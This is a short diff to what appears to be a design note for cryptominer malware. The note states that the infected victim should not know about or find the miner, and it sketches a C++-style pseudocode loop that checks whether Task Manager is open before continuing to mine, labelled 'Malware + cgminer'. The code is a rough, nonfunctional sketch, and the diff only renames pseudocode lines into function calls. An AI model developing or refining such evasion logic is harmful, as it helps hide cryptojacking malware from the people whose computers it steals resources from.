@@ -26,12 +26,12 @@ check if task manager is open
 
 Infected victim should not know or find about the cryptominer
 
-```
+```c++
 global bool lock_taskmanager = false; 
 while(!lock_taskmanager){
-     Check 
+     Check_task_manager();
 }
-continue mining 
+continue_mining(); 
 ```
 
 Malware + cgminer 
